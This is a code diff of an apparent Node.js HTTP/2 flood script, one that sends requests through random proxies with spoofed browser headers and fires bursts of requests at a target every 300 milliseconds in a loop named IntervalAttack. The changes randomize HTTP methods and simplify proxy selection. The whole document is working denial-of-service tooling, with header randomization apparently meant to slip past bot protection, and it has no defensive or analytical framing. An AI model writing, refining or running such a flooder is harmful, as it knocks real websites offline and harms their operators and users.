@@ -340,21 +340,12 @@ return result;
 }
 const randstrsValue = randstrs(10);
 
-// Hàm mới để chọn ngẫu nhiên 5-10 proxy
-function selectRandomProxies(proxies, min, max) {
-    const count = Math.floor(Math.random() * (max - min + 1)) + min; // Chọn số lượng ngẫu nhiên từ min đến max
-    const shuffled = proxies.sort(() => 0.5 - Math.random()); // Xáo trộn danh sách proxy
-    return shuffled.slice(0, count); // Lấy 5-10 proxy đầu tiên
-}
+const httpMethods = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE"];
 
 function runFlooder() {
-    // Chọn 5-10 proxy ngẫu nhiên
-    const selectedProxies = selectRandomProxies(proxies, 5, 10);
-    // Chọn ngẫu nhiên một proxy từ tập hợp đã chọn
-    const proxyAddr = randomElement(selectedProxies);
+    const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
-
     const nm = [
         "110.0.0.0",
         "111.0.0.0",
@@ -446,7 +437,7 @@ function runFlooder() {
         "Razzle",
         "HPC 2008",
     ];
-
+    
     var nm1 = nm[Math.floor(Math.random() * nm.length)];
     var nm2 = sysos[Math.floor(Math.random() * sysos.length)];
     var nm3 = winarch[Math.floor(Math.random() * winarch.length)];
@@ -463,14 +454,14 @@ function runFlooder() {
         "121212",
     ];
     var kha = rd[Math.floor(Math.random() * rd.length)];
-
+    
     encoding_header = [
         'gzip, deflate, br',
         'compress, gzip',
         'deflate, gzip',
         'gzip, identity',
     ];
-
+    
     function randstrr(length) {
         const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
         let result = "";
@@ -480,7 +471,7 @@ function runFlooder() {
         }
         return result;
     }
-
+    
     function randstr(length) {
         const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
         let result = "";
@@ -490,7 +481,7 @@ function runFlooder() {
         }
         return result;
     }
-
+    
     function generateRandomString(minLength, maxLength) {
         const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
         const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
@@ -500,7 +491,7 @@ function runFlooder() {
         });
         return randomStringArray.join('');
     }
-
+    
     const val = {
         'NEl': JSON.stringify({
             "report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
@@ -508,29 +499,29 @@ function runFlooder() {
             "include_subdomains": Math.random() < 0.5 ? true : false
         }),
     };
-
+    
     const rateHeaders = [
-        { "accept": accept_header[Math.floor(Math.random() * accept_header.length)] },
-        { "Access-Control-Request-Method": "GET" },
-        { "accept-language": language_header[Math.floor(Math.random() * language_header.length)] },
-        { "origin": "https://" + parsedTarget.host },
-        { "source-ip": randstr(5) },
-        { "data-return": "false" },
-        { "X-Forwarded-For": parsedProxy[0] },
-        { "NEL": val },
-        { "dnt": "1" },
-        { "A-IM": "Feed" },
-        { 'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none' },
-        { 'Delta-Base': '12340001' },
-        { "te": "trailers" },
-        { "accept-language": language_header[Math.floor(Math.random() * language_header.length)] },
+        {"accept": accept_header[Math.floor(Math.random() * accept_header.length)]},
+        {"Access-Control-Request-Method": "GET"},
+        {"accept-language": language_header[Math.floor(Math.random() * language_header.length)]},
+        {"origin": "https://" + parsedTarget.host},
+        {"source-ip": randstr(5)},
+        {"data-return": "false"},
+        {"X-Forwarded-For": parsedProxy[0]},
+        {"NEL": val},
+        {"dnt": "1"},
+        {"A-IM": "Feed"},
+        {'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
+        {'Delta-Base': '12340001'},
+        {"te": "trailers"},
+        {"accept-language": language_header[Math.floor(Math.random() * language_header.length)]},
     ];
-
+    
     let headers = {
         ":authority": parsedTarget.host,
         ":scheme": "https",
         ":path": parsedTarget.path + "?" + randstr(3) + "=" + generateRandomString(10, 25),
-        ":method": "GET",
+        ":method": httpMethods[Math.floor(Math.random() * httpMethods.length)],
         "pragma": "no-cache",
         "upgrade-insecure-requests": "1",
         "accept-encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)],
@@ -540,25 +531,25 @@ function runFlooder() {
         "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
         "user-agent": "/5.0 (" + nm2 + "; " + nm5 + "; " + nm3 + " ; " + kha + " " + nm4 + ") /Gecko/20100101 Edg/91.0.864.59 " + nm4,
     };
-
+    
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
-        timeout: 10
+        timeout: 10,
     };
-
+    
     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return;
-
+    
         connection.setKeepAlive(true, 600000);
         connection.setNoDelay(true);
-
+    
         const settings = {
             enablePush: false,
             initialWindowSize: 15564991,
         };
-
+    
         const tlsOptions = {
             port: parsedPort,
             secure: true,
@@ -574,16 +565,16 @@ function runFlooder() {
             secureContext: secureContext,
             host: parsedTarget.host,
             servername: parsedTarget.host,
-            secureProtocol: secureProtocol
+            secureProtocol: secureProtocol,
         };
-
+    
         const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);
-
+    
         tlsConn.allowHalfOpen = true;
         tlsConn.setNoDelay(true);
         tlsConn.setKeepAlive(true, 600000);
         tlsConn.setMaxListeners(0);
-
+    
         const client = http2.connect(parsedTarget.href, {
             settings: {
                 headerTableSize: 65536,
@@ -593,10 +584,10 @@ function runFlooder() {
             },
             createConnection: () => tlsConn,
         });
-
+    
         client.setMaxListeners(0);
         client.settings(settings);
-
+    
         client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
                 for (let i = 0; i < args.Rate; i++) {
@@ -604,7 +595,6 @@ function runFlooder() {
                         ...headers,
                         ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
                     };
-
                     const request = client.request({
                         ...dynHeaders,
                     }, {
@@ -621,20 +611,20 @@ function runFlooder() {
                 }
             }, 300);
         });
-
+    
         client.on("close", () => {
             client.destroy();
             tlsConn.destroy();
             connection.destroy();
             return;
         });
-
+    
         client.on("timeout", () => {
             client.destroy();
             connection.destroy();
             return;
         });
-
+    
         client.on("error", error => {
             client.destroy();
             connection.destroy();
